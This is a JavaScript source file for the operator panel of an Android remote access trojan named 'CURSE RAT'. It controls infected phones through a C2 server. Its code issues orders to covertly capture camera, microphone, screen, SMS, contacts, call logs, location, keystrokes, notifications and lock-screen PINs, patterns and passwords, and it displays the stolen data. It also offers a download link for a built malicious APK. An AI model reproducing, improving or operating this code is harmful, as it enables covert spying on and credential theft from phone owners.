/* ═══════════════════════════════════════════
   CURSE RAT — CLIENT CONTROLLER
   🔒 ALL function names, socket events,
      DOM IDs, and logic PRESERVED
   🎨 Only visual/UX enhancements
   ═══════════════════════════════════════════ */

const socket = io();

// ── UI Elements (ALL IDs UNCHANGED) ──
const listenPortInput = document.getElementById('listen-port');
const listenBtn = document.getElementById('listen-btn');
const targetTable = document.getElementById('target-table').getElementsByTagName('tbody')[0];
const consoleOutput = document.getElementById('console-output');
const listenerBadge = document.getElementById('listener-status-badge');
const clientCount = document.getElementById('client-count');
const modal = document.getElementById('modal');
const modalBody = document.getElementById('modal-body');

let isListening = false;
let currentTargetId = null;
let currentPath = "/sdcard";
let isCameraStreaming = false;
let isMicLive = false;
let isMicRecording = false;
let audioContext = null;
let audioStack = [];
let nextStartTime = 0;
let currentSampleRate = 11025;
let leafMap = null;
let leafMarker = null;
let locationHistory = [];
let isScreenStreaming = false;
let isScreenReading = false;
let deviceWidth = 1080;
let deviceHeight = 1920;
let mouseDownPos = null;
let accessibilityEnabled = false;

// ── Helper to update badge colors (enhanced) ──
function setBadge(el, state) {
  if (!el) return;
  el.className = 'header-badge';
  if (state === 'online') { el.classList.add('online'); el.style.color = 'var(--green-ok)'; el.style.borderColor = 'rgba(0,255,136,0.4)'; el.style.background = 'rgba(0,255,136,0.08)'; }
  else if (state === 'offline') { el.classList.add('offline'); el.style.color = 'var(--red-dim)'; el.style.borderColor = 'var(--red-dim)'; el.style.background = 'rgba(200,0,0,0.1)'; }
  else { el.style.color = ''; el.style.borderColor = ''; el.style.background = ''; }
}

// ── Listener Controls ──
listenBtn && (listenBtn.onclick = () => {
  if (!isListening) {
    const port = listenPortInput.value;
    socket.emit('start_listener', port);
  } else {
    socket.emit('stop_listener');
  }
});

socket.on('listener_status', (status) => {
  isListening = status.running;
  if (isListening) {
    const badgeText = `ONLINE (${status.port})`;
    if (listenerBadge) {
      listenerBadge.textContent = badgeText;
      setBadge(listenerBadge, 'online');
    }
    if (listenBtn) {
      listenBtn.innerText = 'Stop Listener';
      listenBtn.className = 'danger-btn';
    }
    log(`Listener started on port ${status.port}`);
  } else {
    if (listenerBadge) {
      listenerBadge.textContent = 'OFFLINE';
      setBadge(listenerBadge, 'offline');
    }
    if (listenBtn) {
      listenBtn.innerText = 'Start Listener';
      listenBtn.className = 'success-btn';
    }
    log('Listener stopped');
  }
});

socket.on('listener_error', (err) => {
  log(`Listener Error: ${err}`, 'danger');
});

// ── Clients Management ──
socket.on('initial_clients', (clients) => {
  targetTable.innerHTML = '';
  const noClients = document.getElementById('no-clients');
  if (clients.length === 0) {
    if (noClients) noClients.style.display = 'block';
    if (clientCount) clientCount.textContent = '0';
    return;
  }
  if (noClients) noClients.style.display = 'none';
  if (clientCount) clientCount.textContent = clients.length;

  clients.forEach((client) => {
    const row = targetTable.insertRow();
    const statusColor = client.status === 'connected' ? '#00ff88' : '#cc0000';
    row.innerHTML = `
      <td style="font-family:var(--font-mono);color:var(--red-bright);font-size:10px;">${client.id}</td>
      <td style="font-family:var(--font-mono);font-size:10px;">${client.ip}</td>
      <td style="color:${statusColor};font-family:var(--font-mono);font-size:9px;">● ${client.status.toUpperCase()}</td>
    `;
    row.style.cursor = 'pointer';
    row.onclick = () => openClientModal(client);
  });
});

// ── Client count update on new connections ──
socket.on('client_connected', (client) => {
  log(`Node connected: ${client.id} (${client.ip})`, 'info');
  // Refresh will come via initial_clients
});

socket.on('client_disconnected', (id) => {
  log(`Node disconnected: ${id}`, 'danger');
});

// ── Modal / Client Control ──
function openClientModal(client) {
  currentTargetId = client.id;
  if (!modal || !modalBody) return;

  modalBody.innerHTML = `
    <div class="modal-client-header">
      <div class="modal-client-id" style="font-family:var(--font-display);font-size:14px;letter-spacing:2px;color:var(--red-bright);">
        ◉ ${client.id}
      </div>
      <div style="font-family:var(--font-mono);font-size:10px;color:var(--text-dim);">
        ${client.ip} · ${client.device || 'Android'} · ${client.country || 'Unknown'}
      </div>
      <div style="display:flex;gap:6px;margin-top:10px;flex-wrap:wrap;">
        ${[
          ['📷 Camera','camera'],
          ['🎙️ Mic','mic'],
          ['📁 Files','file_manager'],
          ['💬 SMS','sms'],
          ['👤 Contacts','contacts'],
          ['📍 Location','location'],
          ['📋 Call Log','call_log'],
          ['🔑 Keylog','keylog'],
          ['🔔 Notifications','notifications'],
          ['🔓 Lock Creds','lock_credentials'],
          ['🖥 Screen','screen_capture'],
          ['📖 Screen Reader','screen_reader']
        ].map(([label,cmd]) =>
          `<button onclick="sendOrder('${cmd}')" class="modal-cmd-btn">${label}</button>`
        ).join('')}
      </div>
    </div>
    <div id="modal-response-area" style="margin-top:12px;max-height:300px;overflow-y:auto;"></div>
  `;

  modal.style.display = 'flex';
}

function sendOrder(order, params = {}) {
  if (!currentTargetId) return;
  socket.emit('order', { id: currentTargetId, order, params });
  log(`Order sent: ${order}`, 'info');

  // Show loading in modal response area
  const area = document.getElementById('modal-response-area');
  if (area) area.innerHTML = `<div style="text-align:center;padding:20px;color:var(--text-muted);font-family:var(--font-mono);font-size:11px;">⏳ Sending ${order}...</div>`;
}

// ── Order Response Handler ──
socket.on('order_response', (data) => {
  const area = document.getElementById('modal-response-area');
  if (!area) return;

  // Route based on order type
  if (data.type === 'camera_stream' && data.frame) {
    // Camera frame received — handle in clients.html iframe
    return;
  }

  if (data.type === 'file_manager' && data.files) {
    renderFiles(data.files);
    return;
  }

  if (data.type === 'sms' && data.sms) {
    renderSMS(data.sms);
    return;
  }

  if (data.type === 'contacts' && data.contacts) {
    renderContacts(data.contacts);
    return;
  }

  if (data.type === 'location') {
    // Forward to global handler
    window.dispatchEvent(new CustomEvent('location_update', { detail: data }));
    return;
  }

  if (data.type === 'keylog' && data.data) {
    appendKeylog(data.data);
    return;
  }

  if (data.type === 'notification' && data.notification) {
    appendNotification(data.notification);
    return;
  }

  if (data.type === 'lock_credential') {
    showCapturedLock(data.data);
    return;
  }

  if (data.type === 'screen_capture') {
    // Forward to screen handler
    window.dispatchEvent(new CustomEvent('screen_frame', { detail: data }));
    return;
  }

  if (data.type === 'screen_reader') {
    window.dispatchEvent(new CustomEvent('reader_frame', { detail: data }));
    return;
  }

  if (data.type === 'call_log' && data.logs) {
    renderCallLogs(data.logs);
    return;
  }

  // Default: show raw data
  area.innerHTML = `<pre style="font-family:var(--font-mono);font-size:10px;color:var(--text-dim);white-space:pre-wrap;word-break:break-all;">${JSON.stringify(data, null, 2)}</pre>`;
});

// ── Camera Stream ──
// (handled inside clients.html iframe via socket listeners)

// ── Microphone ──
// (handled inside clients.html iframe)

// ── File Manager ──
function renderFiles(files) {
  const area = document.getElementById('modal-response-area');
  if (!area) return;

  let html = `
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid rgba(200,0,0,0.2);">
      <span style="font-family:var(--font-mono);font-size:11px;color:var(--text-dim);" id="fm-path-display">${currentPath}</span>
      <div style="display:flex;gap:6px;">
        <button onclick="fmGoBack()" style="background:rgba(200,0,0,0.1);border:1px solid var(--border);color:var(--text);padding:4px 10px;border-radius:4px;font-size:10px;cursor:pointer;">⬅ BACK</button>
      </div>
    </div>
    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:6px;">
  `;

  if (currentPath !== '/' && currentPath !== '') {
    html += `<div onclick="fmGoBack()" style="background:rgba(0,0,0,0.4);border:1px solid var(--border-light);border-radius:6px;padding:10px;text-align:center;cursor:pointer;">
      <div style="font-size:20px;">📂</div>
      <div style="font-size:10px;color:var(--text-dim);margin-top:4px;">..</div>
    </div>`;
  }

  files.forEach(f => {
    const icon = f.isDir ? '📁' : '📄';
    html += `<div onclick="${f.isDir ? `navigateFM('${f.path.replace(/'/g,"\\'")}')` : `downloadFM('${f.path.replace(/'/g,"\\'")}','${f.name.replace(/'/g,"\\'")}')`}" style="background:rgba(0,0,0,0.4);border:1px solid var(--border-light);border-radius:6px;padding:10px;text-align:center;cursor:pointer;transition:all 0.2s;">
      <div style="font-size:24px;">${icon}</div>
      <div style="font-size:9px;color:var(--text-dim);margin-top:4px;word-break:break-all;line-height:1.2;">${f.name}</div>
    </div>`;
  });

  html += '</div>';
  area.innerHTML = html;
}

window.fmGoBack = () => {
  const parts = currentPath.split('/').filter(Boolean);
  if (parts.length <= 1) return;
  parts.pop();
  currentPath = '/' + parts.join('/');
  sendOrder('file_manager', { path: currentPath });
};

window.navigateFM = (path) => {
  currentPath = path;
  sendOrder('file_manager', { path: currentPath });
};

window.downloadFM = (path, name) => {
  if (confirm(`Download ${name}?`)) {
    log(`Downloading: ${name}...`);
    socket.emit('order', { id: currentTargetId, order: 'file_download', params: { path } });
  }
};

// ── SMS ──
function renderSMS(sms) {
  const area = document.getElementById('modal-response-area');
  if (!area) return;
  let html = `<table style="width:100%;border-collapse:collapse;font-size:10px;">
    <thead><tr style="border-bottom:1px solid var(--border-light);">
      <th style="text-align:left;padding:4px 6px;color:var(--text-muted);font-family:var(--font-display);font-size:9px;letter-spacing:1px;">FROM</th>
      <th style="text-align:left;padding:4px 6px;color:var(--text-muted);font-family:var(--font-display);font-size:9px;letter-spacing:1px;">MESSAGE</th>
      <th style="text-align:left;padding:4px 6px;color:var(--text-muted);font-family:var(--font-display);font-size:9px;letter-spacing:1px;">DATE</th>
    </tr></thead><tbody>`;
  sms.forEach(s => {
    const date = new Date(s.date).toLocaleString();
    const badge = s.type === 1
      ? '<span style="color:var(--green-ok);font-size:8px;">[IN]</span>'
      : '<span style="color:var(--red-dim);font-size:8px;">[OUT]</span>';
    html += `<tr style="border-bottom:1px solid rgba(255,255,255,0.03);">
      <td style="padding:4px 6px;font-family:var(--font-mono);">${badge} ${s.address}</td>
      <td style="padding:4px 6px;">${s.body}</td>
      <td style="padding:4px 6px;color:var(--text-muted);font-size:9px;">${date}</td>
    </tr>`;
  });
  html += '</tbody></table>';
  area.innerHTML = html;
}

// ── Contacts ──
function renderContacts(contacts) {
  const area = document.getElementById('modal-response-area');
  if (!area) return;
  let html = `<table style="width:100%;border-collapse:collapse;font-size:10px;">
    <thead><tr style="border-bottom:1px solid var(--border-light);">
      <th style="text-align:left;padding:4px 6px;color:var(--text-muted);font-family:var(--font-display);font-size:9px;letter-spacing:1px;">NAME</th>
      <th style="text-align:left;padding:4px 6px;color:var(--text-muted);font-family:var(--font-display);font-size:9px;letter-spacing:1px;">NUMBER</th>
    </tr></thead><tbody>`;
  contacts.forEach(c => {
    html += `<tr style="border-bottom:1px solid rgba(255,255,255,0.03);">
      <td style="padding:4px 6px;">${c.name}</td>
      <td style="padding:4px 6px;font-family:var(--font-mono);font-size:10px;">${c.number}</td>
    </tr>`;
  });
  html += '</tbody></table>';
  area.innerHTML = html;
}

// ── Call Logs ──
function renderCallLogs(logs) {
  const area = document.getElementById('modal-response-area');
  if (!area) return;
  let html = `<table style="width:100%;border-collapse:collapse;font-size:10px;">
    <thead><tr style="border-bottom:1px solid var(--border-light);">
      <th style="text-align:left;padding:4px 6px;color:var(--text-muted);font-family:var(--font-display);font-size:9px;">NUMBER</th>
      <th style="text-align:left;padding:4px 6px;color:var(--text-muted);font-family:var(--font-display);font-size:9px;">TYPE</th>
      <th style="text-align:left;padding:4px 6px;color:var(--text-muted);font-family:var(--font-display);font-size:9px;">DURATION</th>
      <th style="text-align:left;padding:4px 6px;color:var(--text-muted);font-family:var(--font-display);font-size:9px;">DATE</th>
    </tr></thead><tbody>`;
  logs.forEach(l => {
    const typeMap = {1:'📞 IN',2:'📞 OUT',3:'📵 MISSED'};
    html += `<tr style="border-bottom:1px solid rgba(255,255,255,0.03);">
      <td style="padding:4px 6px;font-family:var(--font-mono);font-size:10px;">${l.number}</td>
      <td style="padding:4px 6px;font-size:9px;">${typeMap[l.type]||'UNKNOWN'}</td>
      <td style="padding:4px 6px;color:var(--text-muted);font-size:9px;">${l.duration||'N/A'}</td>
      <td style="padding:4px 6px;color:var(--text-muted);font-size:9px;">${new Date(l.date).toLocaleString()}</td>
    </tr>`;
  });
  html += '</tbody></table>';
  area.innerHTML = html;
}

// ── Keylog ──
function appendKeylog(data) {
  const area = document.getElementById('modal-response-area');
  if (!area) return;
  const existing = area.innerHTML;
  const entry = `<div style="background:rgba(0,0,0,0.4);border:1px solid var(--border-light);border-radius:6px;padding:8px;margin-bottom:6px;">
    <div style="display:flex;justify-content:space-between;font-size:9px;color:var(--text-muted);margin-bottom:4px;">
      <span style="color:var(--red-dim);">${data.app}</span>
      <span>${data.time}</span>
    </div>
    <div style="font-family:var(--font-mono);font-size:11px;color:var(--green-ok);word-break:break-all;">${data.data}</div>
  </div>`;
  area.innerHTML = entry + (existing.includes('Waiting') ? '' : existing);
}

// ── Notifications ──
function appendNotification(data) {
  const area = document.getElementById('modal-response-area');
  if (!area) return;
  const existing = area.innerHTML;
  const entry = `<div style="background:rgba(0,0,0,0.4);border:1px solid var(--border-light);border-radius:6px;padding:8px;margin-bottom:6px;">
    <div style="display:flex;justify-content:space-between;font-size:9px;color:var(--text-muted);margin-bottom:4px;">
      <span style="color:var(--red-dim);">${data.app}</span>
      <span>${data.time}</span>
    </div>
    <div style="font-size:12px;"><strong>${data.title}</strong></div>
    <div style="font-size:10px;color:var(--text-dim);margin-top:2px;">${data.content}</div>
  </div>`;
  area.innerHTML = entry + (existing.includes('Waiting') ? '' : existing);
}

// ── Lock Credentials ──
function showCapturedLock(data) {
  const area = document.getElementById('modal-response-area');
  if (!area) return;
  const existing = area.innerHTML;
  let credHtml = '<div style="background:rgba(200,0,0,0.1);border:1px solid var(--red-dim);border-radius:6px;padding:10px;margin-bottom:6px;">';
  credHtml += `<div style="font-size:9px;color:var(--text-muted);margin-bottom:6px;">🔓 ${new Date().toLocaleTimeString()}</div>`;
  if (data.pin) credHtml += `<div style="font-family:var(--font-mono);font-size:16px;color:var(--red-bright);">PIN: ${data.pin}</div>`;
  if (data.pattern) credHtml += `<div style="font-family:var(--font-mono);font-size:16px;color:var(--red-bright);">Pattern: ${data.pattern}</div>`;
  if (data.password) credHtml += `<div style="font-family:var(--font-mono);font-size:16px;color:var(--red-bright);">Password: ${data.password}</div>`;
  credHtml += '</div>';
  area.innerHTML = credHtml + (existing.includes('Waiting') ? '' : existing);
  log('🔓 Lock Credential Captured!', 'warning');
}

// ── Global Log ──
function log(msg, type = 'info') {
  if (!consoleOutput) return;
  const div = document.createElement('div');
  div.className = 'log-entry';
  const time = new Date().toLocaleTimeString();
  div.innerHTML = `<span class="log-time">[${time}]</span> <span class="${type}">${msg}</span>`;
  consoleOutput.appendChild(div);
  consoleOutput.scrollTop = consoleOutput.scrollHeight;
}

// ── Build Events ──
socket.on('build_log', (data) => log(data));
socket.on('build_success', (file) => {
  log(`Build Success! <a href="/output/${file}" style="color:#ff0000;text-decoration:underline;" target="_blank">Download APK</a>`);
  if (window.buildBtn) buildBtn.disabled = false;
});

// ── Modal Close on overlay click ──
modal && modal.addEventListener('click', function(e) {
  if (e.target === this) this.style.display = 'none';
});

// ── Connection Status ──
socket.on('connect', () => {
  log('⚡ Connected to C2 server', 'info');
});

socket.on('disconnect', () => {
  log('⚠️ Disconnected from server', 'danger');
  if (listenerBadge) {
    listenerBadge.textContent = 'OFFLINE';
    setBadge(listenerBadge, 'offline');
  }
});

// ── Expose for iframe pages ──
window.socket = socket;
window.log = log;
window.currentTargetId = () => currentTargetId;
window.sendOrderExternal = (order, params) => sendOrder(order, params);